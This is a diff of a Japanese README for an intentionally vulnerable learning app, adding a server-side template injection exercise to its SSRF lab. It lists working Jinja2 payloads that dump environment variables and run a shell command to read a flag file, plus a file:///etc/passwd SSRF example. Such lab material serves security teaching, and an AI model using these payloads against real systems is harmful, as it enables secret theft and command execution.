@@ -1,7 +1,7 @@
-# Vulnerable App for SSRF Learning
+# Vulnerable App for Learning
 
-このアプリケーションは、SSRF (Server-Side Request Forgery) の脆弱性を学習するためのデモンストレーション環境です。
-より実践的なシナリオを体験できるよう、OGPプレビュー機能と内部APIの分離が実装されています。
+このアプリケーションは、SSRF (Server-Side Request Forgery) や SSTI (Server-Side Template Injection) などの脆弱性を学習するためのデモンストレーション環境です。
+より実践的なシナリオを体験できるよう、複数の機能が実装されています。
 
 ## 🚀 セットアップ方法
 
@@ -42,6 +42,26 @@
     *   **ローカルファイルへのアクセス (例):** `file:///etc/passwd`
         *   コンテナ内の `/etc/passwd` の内容が表示されます。
 
+### 📝 社内メンバー紹介カード機能 (SSTIのデモンストレーション)
+
+`http://localhost:5000/personalize` にアクセスしてください。
+
+1.  **シナリオ:**
+    社内メンバーのプロフィールカードを生成する機能です。「座右の銘」フィールドにテンプレート構文を直接入力できるため、SSTI (Server-Side Template Injection) の脆弱性が存在します。
+
+2.  **SSTI攻撃の実行:**
+    *   「座右の銘」に以下のペイロードを入力し、「カードを生成」ボタンをクリックしてください。
+    *   **環境変数の窃取:**
+        ```jinja2
+        {{ lipsum.__globals__['os'].environ }}
+        ```
+        サーバーの環境変数を表示させます。
+    *   **ファイル読み取り:**
+        ```jinja2
+        {{ lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag.txt').read() }}
+        ```
+        コンテナ内の `flag.txt` の内容を読み取ります。
+    
 ### 🔒 内部API (直接アクセス不可)
 
 `http://localhost:5000/internal` に直接アクセスしてみてください。
